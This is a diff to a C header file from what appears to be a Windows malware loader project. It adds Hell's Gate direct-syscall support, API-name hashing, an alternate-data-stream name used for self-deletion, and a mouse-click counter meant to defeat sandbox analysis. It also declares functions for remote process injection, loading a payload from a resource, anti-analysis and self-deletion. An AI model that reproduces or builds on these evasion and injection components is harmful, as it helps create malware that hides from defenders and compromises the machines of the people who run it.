@@ -1,10 +1,25 @@
 #pragma once
 #include <Windows.h>
 #include <stdio.h>
-#include "Resource.h"
+#include "HellsGate.h"
 
+// Initial seed used for hashing
 #define INITIAL_SEED	0x7
+
+// Real time hashing function
 #define RTIME_HASH(API) HashStringRotr32((LPCSTR) API)
+
+// New alternate datastream name
+#define NEW_STREAM L":DummyStream"
+
+// Hook handle for unhooking
+extern HHOOK g_hMouseHook;
+
+// Mouse click counter
+extern DWORD g_dwMouseClicks;
+
+// Minimum click for passing anti-analysis
+#define REQUIRED_CLICKS 10
 
 /*--------------------------------------------------------------------
   STRUCTURES
@@ -341,7 +356,6 @@ typedef struct _INITIAL_TEB {
 	PVOID                StackReserved;
 } INITIAL_TEB, * PINITIAL_TEB;
 
-
 // Used in Injection.c
 typedef enum _SECTION_INHERIT {
 	ViewShare = 1,
@@ -556,7 +570,7 @@ typedef enum _SYSTEM_INFORMATION_CLASS
 
 } SYSTEM_INFORMATION_CLASS;
 
-// Used in Common.c by SelfDelete()
+// Used in AntiAnalysis.c by SelfDelete()
 typedef struct _FILE_RENAME_INFORMATION
 {
 	BOOLEAN ReplaceIfExists;
@@ -581,3 +595,10 @@ BOOL ReadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 INT StringCompareW(IN LPCWSTR String1, IN LPCWSTR String2);
 LPCWSTR LowerCaseStringW(IN LPCWSTR String);
 WCHAR ToLowerCharW(IN WCHAR character);
+
+// Defined in Injection.c
+BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);
+
+// Defined in AntiAnalysis.c
+BOOL SelfDelete();
+BOOL AntiAnalysis(DWORD dwMilliSeconds);
